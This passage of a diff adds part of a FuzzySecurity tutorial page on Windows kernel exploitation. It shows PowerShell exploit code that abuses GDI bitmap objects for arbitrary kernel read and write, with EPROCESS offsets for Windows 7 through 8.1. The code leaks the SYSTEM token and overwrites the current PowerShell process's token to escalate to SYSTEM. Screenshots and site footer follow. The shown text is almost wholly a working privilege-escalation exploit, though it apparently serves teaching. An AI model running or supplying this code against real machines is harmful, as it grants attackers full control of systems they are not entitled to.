+    '6.3' # Win8.1 / 2k12R2
+    {
+        if(!$x32Architecture){
+            $UniqueProcessIdOffset = 0x2e0
+            $TokenOffset = 0x348          
+            $ActiveProcessLinks = 0x2e8
+        } else {
+            $UniqueProcessIdOffset = 0xb4
+            $TokenOffset = 0xec          
+            $ActiveProcessLinks = 0xb8
+        }
+    }
+ 
+    '6.2' # Win8 / 2k12
+    {
+        if(!$x32Architecture){
+            $UniqueProcessIdOffset = 0x2e0
+            $TokenOffset = 0x348          
+            $ActiveProcessLinks = 0x2e8
+        } else {
+            $UniqueProcessIdOffset = 0xb4
+            $TokenOffset = 0xec          
+            $ActiveProcessLinks = 0xb8
+        }
+    }
+ 
+    '6.1' # Win7 / 2k8R2
+    {
+        if(!$x32Architecture){
+            $UniqueProcessIdOffset = 0x180
+            $TokenOffset = 0x208          
+            $ActiveProcessLinks = 0x188
+        } else {
+            $UniqueProcessIdOffset = 0xb4
+            $TokenOffset = 0xf8          
+            $ActiveProcessLinks = 0xb8
+        }
+    }
+}
+
+# Arbitrary Kernel read
+function Bitmap-Read {
+    param ($Address)
+    $CallResult = [EVD]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
+    [IntPtr]$Pointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
+    $CallResult = [EVD]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer)
+	if ($x32Architecture){
+    	[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
+	} else {
+		[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
+	}
+    $CallResult = [EVD]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
+}
+
+# Arbitrary Kernel write
+function Bitmap-Write {
+    param ($Address, $Value)
+    $CallResult = [EVD]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
+    $CallResult = [EVD]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
+}
+
+# Get EPROCESS entry for System process
+echo "`n[>] Leaking SYSTEM _EPROCESS.."
+$KernelBase = $SystemModuleArray[0].ImageBase
+$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
+$KernelHanle = [EVD]::LoadLibrary("$KernelType")
+$PsInitialSystemProcess = [EVD]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
+$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
+$CallResult = [EVD]::FreeLibrary($KernelHanle)
+echo "[+] _EPORCESS list entry: 0x$("{0:X}" -f $SysEprocessPtr)"
+$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
+echo "[+] SYSTEM _EPORCESS address: 0x$("{0:X}" -f $(Bitmap-Read -Address $SysEprocessPtr))"
+echo "[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))"
+echo "[+] SYSTEM Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
+$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
+
+# Get EPROCESS entry for current process
+echo "`n[>] Leaking current _EPROCESS.."
+echo "[+] Traversing ActiveProcessLinks list"
+$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
+while($true) {
+	$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
+	if ($NextPID -eq $PID) {
+		echo "[+] PowerShell _EPORCESS address: 0x$("{0:X}" -f $NextProcess)"
+		echo "[+] PID: $NextPID"
+		echo "[+] PowerShell Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
+		$PoShTokenAddr = $NextProcess+$TokenOffset
+		break
+	}
+	$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
+}
+
+# Duplicate token!
+echo "`n[!] Duplicating SYSTEM token!`n"
+Bitmap-Write -Address $PoShTokenAddr -Value $SysToken
+
+#==============================================[/Duplicate SYSTEM token]</pre>
+</div>
+
+<p>&nbsp;</p>
+<p><span style="color: #ffffff;"><strong>Win10 x64 v1511</strong></span></p>
+<p>&nbsp;</p>
+<img src="images/Kernel_GDI_13.png">
+<p>&nbsp;</p>
+
+<p><span style="color: #ffffff;"><strong>Win7 x32</strong></span></p>
+<p>&nbsp;</p>
+<img src="images/Kernel_GDI_14.png">
+<p>&nbsp;</p>
+
+</div>
+    </div>
+</div>
+
+      <!-- End  -->
+    	</div>    
+    </div><!-- End page-columns -->
+     
+         <div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+             <span id="IDCommentsPostTitle" style="display:none"></span>
+           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
+         </div>
+     
+  </div><!-- <<< End Container >>> -->
+  
+  <footer>
+    <div class="container">
+    
+      
+      <div class="six columns"><span class="copyright">
+      © Copyright <a href="../../index.html">FuzzySecurity</a></span></div>
+      
+      <div class="six columns">
+        
+          <p><a href="../../index.html">Home</a> |
+          <a href="../../tutorials.html">Tutorials</a> |
+          <a href="../../coding.html">Scripting</a> |
+          <a href="../../exploits.html">Exploits</a> |
+          <a href="../../links.html">Links</a> |
+          <a href="../../contact.html">Contact</a></p>
+        
+      </div>
+    
+    </div><!-- End container -->
+  </footer><!-- <<< End Footer >>> -->
+  
+  </div><!-- End wrap -->
+  
+  <!-- Start Style Switcher -->
+  <div class="switcher"></div>
+  <!-- End Style Switcher -->
+    
+</body>
+</html>
